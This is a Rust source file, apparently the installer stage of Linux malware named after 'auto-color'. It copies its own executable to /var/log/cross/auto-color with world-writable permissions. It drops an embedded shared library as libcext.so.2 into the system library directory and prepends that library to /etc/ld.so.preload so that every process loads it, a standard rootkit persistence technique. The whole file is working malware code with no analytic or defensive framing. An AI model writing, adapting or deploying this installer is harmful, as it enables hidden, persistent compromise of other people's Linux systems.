use std::{env, ffi::CStr, fs::{self, File}, io::Write, os::{raw::c_void, unix::fs::PermissionsExt}, path::PathBuf};
use libc::{dladdr, strerror, Dl_info};
use std::io::Read;
use log::{info, error, warn};

pub fn main() {
    info!("🚀 Starting installation process...");
    copy_self();
    let lib_path = drop_library();
    add_preload_hook(lib_path);
    info!("✅ Installation process completed.");
}

fn add_preload_hook(full_path: PathBuf) {
    info!("🔧 Adding preload hook for library at: {}", full_path.display());
    let mut preload_contents = String::new();
    if let Ok(mut preload_file) = File::open("/etc/ld.so.preload") {
        preload_file.read_to_string(&mut preload_contents).unwrap();
    }

    if !preload_contents.trim_end().contains(full_path.to_string_lossy().as_ref()) {
        let mut preload_file = File::create("/etc/ld.so.preload").unwrap();
        if !preload_contents.trim_end().is_empty() {
            writeln!(preload_file, "{};{}", full_path.display(), preload_contents.trim_end()).unwrap();
        } else {
            writeln!(preload_file, "{}", full_path.display()).unwrap();
        }
        info!("✅ Preload hook added successfully.");
    } else {
        info!("ℹ️ Preload hook already exists.");
    }
}

fn copy_self() {
    info!("📂 Copying executable to /var/log/cross/");
    let base_path = PathBuf::from("/var/log/cross/");
    if fs::create_dir_all(&base_path).is_err() {
        error!("⚠️ Failed to create directory at /var/log/cross/");
        return;
    }
    if fs::set_permissions(&base_path, fs::Permissions::from_mode(0o777)).is_err() {
        error!("⚠️ Failed to set permissions for /var/log/cross/");
        return;
    }

    let full_path = base_path.join("auto-color");
    if fs::copy(env::current_exe().unwrap(), &full_path).is_err() {
        error!("⚠️ Failed to copy executable to {}", full_path.display());
        return;
    }
    if fs::set_permissions(&full_path, fs::Permissions::from_mode(0o777)).is_err() {
        error!("⚠️ Failed to set permissions for {}", full_path.display());
        return;
    }
    info!("✅ Executable copied successfully to {}", full_path.display());
}

fn drop_library() -> PathBuf {
    info!("📦 Dropping library...");
    let base_path = find_library_path();
    let full_path = base_path.join("libcext.so.2");
    let mut file = match File::create(&full_path) {
        Ok(f) => f,
        Err(_) => {
            error!("⚠️ Failed to create library file at {}", full_path.display());
            return full_path;
        }
    };
    if file.write(include_bytes!("../library/target/x86_64-unknown-linux-gnu/release/liblibrary.so")).is_err() {
        error!("⚠️ Failed to write library contents to {}", full_path.display());
    }
    if fs::set_permissions(&full_path, fs::Permissions::from_mode(0o777)).is_err() {
        error!("⚠️ Failed to set permissions for {}", full_path.display());
    }
    info!("✅ Library dropped at {}", full_path.display());
    full_path
}

fn find_library_path() -> PathBuf {
    info!("🔍 Finding library path...");
    let mut dl_info = Dl_info {
        dli_fname: core::ptr::null(),
        dli_fbase: core::ptr::null_mut(),
        dli_sname: core::ptr::null(),
        dli_saddr: core::ptr::null_mut(),
    };
    if unsafe { dladdr(strerror as *const c_void, &mut dl_info as *mut Dl_info) } != 0 && !dl_info.dli_fname.is_null() {
        if let Ok(path) = unsafe { CStr::from_ptr(dl_info.dli_fname) }.to_str() {
            let mut path_buf = PathBuf::from(path);
            path_buf.pop();
            info!("✅ Library path found: {}", path_buf.display());
            return path_buf;
        }
    }
    warn!("⚠️ Failed to find library path, defaulting to /lib");
    PathBuf::from("/lib")
}